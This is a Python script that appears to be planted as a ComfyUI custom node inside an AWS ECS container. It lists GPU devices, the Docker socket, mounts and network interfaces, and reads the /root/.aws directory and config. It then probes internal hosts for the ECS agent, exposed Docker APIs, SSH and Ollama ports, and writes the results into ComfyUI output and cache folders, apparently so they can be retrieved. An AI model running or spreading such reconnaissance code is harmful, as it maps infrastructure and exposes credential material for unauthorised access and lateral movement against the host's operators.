#!/usr/bin/env python3
# ul-ecs-node4: host-reach probe from inside the ECS task container
import os, json, time, socket, subprocess

TAG = "ul29641v5"
R = {"_meta": {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "cwd": os.getcwd()}}

def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (("\nERR:" + p.stderr) if p.stderr else ""))[:4000]
    except Exception as e:
        return "EXC:%r" % (e,)

def tcp(h, p, t=4):
    t0 = time.time()
    try:
        s = socket.create_connection((h, p), timeout=t); s.close()
        return {"ok": True, "ms": int((time.time() - t0) * 1000)}
    except Exception as e:
        return {"ok": False, "err": type(e).__name__, "ms": int((time.time() - t0) * 1000)}

R["gpu"] = sh("cat /proc/driver/nvidia/version 2>&1; ls -l /dev/nvidia* 2>&1; ls /sys/module/nvidia 2>&1 | head -3")
R["docker"] = sh("ls -l /var/run/docker.sock 2>&1; ls /var/run/ 2>&1 | head -20")
R["mounts"] = sh("cat /proc/mounts | grep -Ev 'proc|sys|dev|cgroup|mqueue|shm|pts' | head -20")
R["awsdir"] = sh("ls -la /root/.aws 2>&1; cat /root/.aws/config 2>&1 | head -20")
R["hosts"] = sh("cat /etc/hosts; ip -4 a 2>/dev/null || ifconfig 2>/dev/null | head -30")
targets = [("169.254.172.2", 51678), ("172.16.8.1", 51678), ("172.16.8.1", 2375),
           ("172.16.8.1", 22), ("172.16.8.38", 2375), ("172.16.8.38", 2376),
           ("172.16.8.38", 22), ("172.16.8.38", 11434), ("127.0.0.1", 8188)]
R["tcp"] = {"%s:%d" % t: tcp(*t) for t in targets}
body = json.dumps(R, default=str)
root = os.getcwd()
for _ in range(4):
    if os.path.isdir(os.path.join(root, "custom_nodes")):
        break
    root = os.path.dirname(root)
for p in ["/ComfyUI/output/" + TAG + ".json", os.path.join(root, "output", TAG + ".json"),
          "/ComfyUI/user/ComfyUI-Manager/cache/" + TAG + ".json", "/tmp/" + TAG + ".json"]:
    try:
        d = os.path.dirname(p)
        if d and not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        open(p, "w").write(body)
    except Exception:
        pass
print("[%s] OK %d" % (TAG, len(body)), flush=True)
print(body[:1500], flush=True)
